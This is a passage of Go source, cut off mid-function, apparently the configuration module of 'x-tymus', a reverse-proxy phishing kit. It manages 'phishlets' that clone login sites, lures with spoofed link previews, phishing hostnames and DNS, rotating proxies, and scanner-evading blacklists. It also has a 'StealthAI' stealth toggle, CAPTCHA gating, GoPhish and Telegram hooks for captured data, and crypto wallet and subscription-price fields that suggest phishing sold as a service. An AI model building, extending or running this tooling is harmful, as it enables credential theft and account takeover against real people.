package core

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/x-tymus/x-tymus/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
	UserId         string `mapstructure:"user_id" json:"user_id" yaml:"user_id"`
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
}

type Proxy struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
}

type ProxyConfig struct {
	Proxies      []Proxy `mapstructure:"proxies" json:"proxies" yaml:"proxies"`
	Enabled      bool    `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	CurrentIndex int     `mapstructure:"current_index" json:"current_index" yaml:"current_index"`
}

type BlacklistConfig struct {
	Mode            string   `mapstructure:"mode" json:"mode" yaml:"mode"`
	UARegex         []string `mapstructure:"ua_regex" json:"ua_regex" yaml:"ua_regex"`
	FeedURLs        []string `mapstructure:"feeds" json:"feeds" yaml:"feeds"`
	FeedInterval    int      `mapstructure:"feed_interval" json:"feed_interval" yaml:"feed_interval"` // seconds
	Whitelist       []string `mapstructure:"whitelist" json:"whitelist" yaml:"whitelist"`
	EnableASNLookup bool     `mapstructure:"enable_asn_lookup" json:"enable_asn_lookup" yaml:"enable_asn_lookup"`
	ASNLookupURL    string   `mapstructure:"asn_lookup_url" json:"asn_lookup_url" yaml:"asn_lookup_url"`
	ASNWhitelist    []int    `mapstructure:"asn_whitelist" json:"asn_whitelist" yaml:"asn_whitelist"`
}

// GetStats returns number of IPs and masks currently loaded in the blacklist.
// This is a lightweight stub to satisfy terminal usage; real implementation may vary.
func (b *BlacklistConfig) GetStats() (int, int) {
	// no detailed blacklist loaded in this simplified config, return zeros
	return 0, 0
}

// SetVerbose enables or disables verbose logging for blacklist operations.
func (b *BlacklistConfig) SetVerbose(enabled bool) {
	// stub: no-op for now
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

// Setup prepares the GoPhish client configuration. This is a stub used by terminal tests.
func (g *GoPhishConfig) Setup(adminURL string, apiKey string, insecure bool) {
	g.AdminUrl = adminURL
	g.ApiKey = apiKey
	g.InsecureTLS = insecure
}

// Test attempts a lightweight connectivity test to gophish. Here we just validate configuration.
func (g *GoPhishConfig) Test() error {
	if g.AdminUrl == "" || g.ApiKey == "" {
		return fmt.Errorf("gophish: admin url or api key not set")
	}
	// In the real implementation, you'd attempt to contact the GoPhish API here.
	return nil
}

type GeneralConfig struct {
	Domain             string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4            string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4       string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4           string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl          string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort          int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort            int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	WebhookTelegram    string `mapstructure:"webhook_telegram" json:"webhook_telegram" yaml:"webhook_telegram"`
	Autocert           bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
	DefaultRedirectUrl   string `mapstructure:"default_redirect_url" json:"default_redirect_url" yaml:"default_redirect_url"`
	AdminPassword        string `mapstructure:"admin_password" json:"admin_password" yaml:"admin_password"`
	RedirectChainSecret  string `mapstructure:"redirect_chain_secret" json:"redirect_chain_secret" yaml:"redirect_chain_secret"`
	BotToken             string `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
	BotAdminChatId       int64  `mapstructure:"bot_admin_chat_id" json:"bot_admin_chat_id" yaml:"bot_admin_chat_id"`
	CryptoBTC            string `mapstructure:"crypto_btc" json:"crypto_btc" yaml:"crypto_btc"`
	CryptoETH            string `mapstructure:"crypto_eth" json:"crypto_eth" yaml:"crypto_eth"`
	CryptoUSDT           string `mapstructure:"crypto_usdt" json:"crypto_usdt" yaml:"crypto_usdt"`
	SubPrice             int    `mapstructure:"sub_price" json:"sub_price" yaml:"sub_price"`
	DefaultPhishlet      string `mapstructure:"default_phishlet" json:"default_phishlet" yaml:"default_phishlet"`
	CloudflareMode       bool   `mapstructure:"cloudflare_mode" json:"cloudflare_mode" yaml:"cloudflare_mode"`
	SmtpHost             string `mapstructure:"smtp_host" json:"smtp_host" yaml:"smtp_host"`
	SmtpPort             int    `mapstructure:"smtp_port" json:"smtp_port" yaml:"smtp_port"`
	SmtpUser             string `mapstructure:"smtp_user" json:"smtp_user" yaml:"smtp_user"`
	SmtpPass             string `mapstructure:"smtp_pass" json:"smtp_pass" yaml:"smtp_pass"`
	SmtpFrom             string `mapstructure:"smtp_from" json:"smtp_from" yaml:"smtp_from"`
}

type DNSEntry struct {
	Type  string `mapstructure:"type" json:"type" yaml:"type"`
	Value string `mapstructure:"value" json:"value" yaml:"value"`
}

type Config struct {
	general           *GeneralConfig
	siteDomains       map[string]string
	baseDomain        string
	certificates      *CertificatesConfig
	blacklistConfig   *BlacklistConfig
	gophishConfig     *GoPhishConfig
	proxyConfig       *ProxyConfig
	phishletConfig    map[string]*PhishletConfig
	phishlets         map[string]*Phishlet
	phishletNames     []string
	activeHostnames   []string
	redirectorsDir    string
	lures             []*Lure
	lureIds           []string
	subphishlets      []*SubPhishlet
	cfg               *viper.Viper
	dnsentries        map[string]*DNSEntry
	turnstile_sitekey string
	turnstile_privkey string
	recaptcha_sitekey string
	recaptcha_privkey string
	StealthAIEnabled  bool
	CrtDb             *CertDb
}

// GlobalConfig is set to the active Config instance at startup for other
// packages to consult runtime settings (like blacklist config).
var GlobalConfig *Config

const (
	CFG_GENERAL           = "general"
	CFG_CERTIFICATES      = "certificates"
	CFG_LURES             = "lures"
	CFG_PROXY             = "proxy"
	CFG_PHISHLETS         = "phishlets"
	CFG_BLACKLIST         = "blacklist"
	CFG_STEALTHAI         = "stealthai"
	CFG_SUBPHISHLETS      = "subphishlets"
	CFG_GOPHISH           = "gophish"
	CFG_DNSENTRIES        = "dnsentries"
	CFG_TURNSTILE_SITEKEY = "turnstile_sitekey"
	CFG_TURNSTILE_PRIVKEY = "turnstile_privkey"
	CFG_RECAPTCHA_SITEKEY = "recaptcha_sitekey"
	CFG_RECAPTCHA_PRIVKEY = "recaptcha_privkey"
)

const DEFAULT_UNAUTH_URL = "https://www.google.com" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:          &GeneralConfig{},
		certificates:     &CertificatesConfig{},
		gophishConfig:    &GoPhishConfig{},
		phishletConfig:   make(map[string]*PhishletConfig),
		phishlets:        make(map[string]*Phishlet),
		phishletNames:    []string{},
		lures:            []*Lure{},
		blacklistConfig:  &BlacklistConfig{},
		dnsentries:       make(map[string]*DNSEntry),
		StealthAIEnabled: false,
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
	c.cfg.UnmarshalKey(CFG_STEALTHAI, &c.StealthAIEnabled)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.RedirectChainSecret == "" {
		c.general.RedirectChainSecret = GenRandomString(32)
		c.cfg.Set(CFG_GENERAL+".redirect_chain_secret", c.general.RedirectChainSecret)
		c.cfg.WriteConfig()
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
	c.cfg.UnmarshalKey(CFG_DNSENTRIES, &c.dnsentries)
	c.turnstile_sitekey = c.cfg.GetString(CFG_TURNSTILE_SITEKEY)
	c.turnstile_privkey = c.cfg.GetString(CFG_TURNSTILE_PRIVKEY)
	c.recaptcha_sitekey = c.cfg.GetString(CFG_RECAPTCHA_SITEKEY)
	c.recaptcha_privkey = c.cfg.GetString(CFG_RECAPTCHA_PRIVKEY)

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	if c.general.Domain == "" {
		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart x-tymus for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsEntry(name string, rtype string, value string) {
	rtypes := []string{"A", "CNAME"}
	if !stringExists(rtype, rtypes) {
		log.Error("invalid record type %s, allowed types are %s", rtype, strings.Join(rtypes, ","))
		return
	}
	entry := &DNSEntry{rtype, value}
	c.dnsentries[name] = entry
	c.cfg.Set(CFG_DNSENTRIES, c.dnsentries)
	log.Info("DNS entry set: %s -> %s: %s", name, rtype, value)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	if len(c.proxyConfig.Proxies) == 0 {
		c.AddProxy("http", "127.0.0.1", 8080, "", "")
	}
	c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	if len(c.proxyConfig.Proxies) == 0 {
		c.AddProxy("http", "127.0.0.1", 8080, "", "")
	}
	c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	if len(c.proxyConfig.Proxies) == 0 {
		c.AddProxy("http", "127.0.0.1", 8080, "", "")
	}
	c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	if len(c.proxyConfig.Proxies) == 0 {
		c.AddProxy("http", "127.0.0.1", 8080, "", "")
	}
	c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	if len(c.proxyConfig.Proxies) == 0 {
		c.AddProxy("http", "127.0.0.1", 8080, "", "")
	}
	c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

// New methods for proxy rotation
func (c *Config) AddProxy(ptype, address string, port int, username, password string) {
	proxy := Proxy{
		Type:     ptype,
		Address:  address,
		Port:     port,
		Username: username,
		Password: password,
	}
	c.proxyConfig.Proxies = append(c.proxyConfig.Proxies, proxy)
	if len(c.proxyConfig.Proxies) == 1 {
		c.proxyConfig.CurrentIndex = 0
	}
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("added proxy: %s://%s:%d", ptype, address, port)
	c.cfg.WriteConfig()
}

func (c *Config) GetProxyEnabled() bool {
	return c.proxyConfig.Enabled
}

func (c *Config) GetCurrentProxy() *Proxy {
	if len(c.proxyConfig.Proxies) == 0 || !c.proxyConfig.Enabled {
		return nil
	}
	return &c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex]
}

func (c *Config) RotateProxy() {
	if len(c.proxyConfig.Proxies) > 1 {
		c.proxyConfig.CurrentIndex = (c.proxyConfig.CurrentIndex + 1) % len(c.proxyConfig.Proxies)
		c.cfg.Set(CFG_PROXY, c.proxyConfig)
		log.Info("rotated to proxy %d: %s://%s:%d", c.proxyConfig.CurrentIndex, c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Type, c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Address, c.proxyConfig.Proxies[c.proxyConfig.CurrentIndex].Port)
		c.cfg.WriteConfig()
	}
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)

}

func (c *Config) SetStealthAIEnabled(enabled bool) {
	c.StealthAIEnabled = enabled
	c.cfg.Set(CFG_STEALTHAI, enabled)
	c.cfg.WriteConfig()
	if enabled {
		log.Info("StealthAI module enabled.")
	} else {
		log.Info("StealthAI module disabled.")
	}
}

func (c *Config) IsStealthAIEnabled() bool {
	return c.StealthAIEnabled
}

func (c *Config) SetWebhookTelegram(webhook string) {
	c.general.WebhookTelegram = webhook
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("EvilHoster Telegram webhook set to: %s", webhook)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstileSitekey(key string) {
	c.turnstile_sitekey = key
	c.cfg.Set(CFG_TURNSTILE_SITEKEY, key)
	log.Info("Turnstile site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstilePrivkey(key string) {
	c.turnstile_privkey = key
	c.cfg.Set(CFG_TURNSTILE_PRIVKEY, key)
	log.Info("Turnstile private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaSitekey(key string) {
	c.recaptcha_sitekey = key
	c.cfg.Set(CFG_RECAPTCHA_SITEKEY, key)
	log.Info("reCAPTCHA site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaPrivkey(key string) {
	c.recaptcha_privkey = key
	c.cfg.Set(CFG_RECAPTCHA_PRIVKEY, key)
	log.Info("reCAPTCHA private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) GetAllLures() []*Lure {
	return c.lures
}

// GetLureIndexByPtr returns the integer index of the given lure pointer, or -1 if not found.
func (c *Config) GetLureIndexByPtr(l *Lure) int {
	for i, lure := range c.lures {
		if lure == l {
			return i
		}
	}
	return -1
}

func (c *Config) GetLuresByUser(userUsername string) []*Lure {
	var out []*Lure
	for _, l := range c.lures {
		if l.UserId == userUsername {
			out = append(out, l)
		}
	}
	return out
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
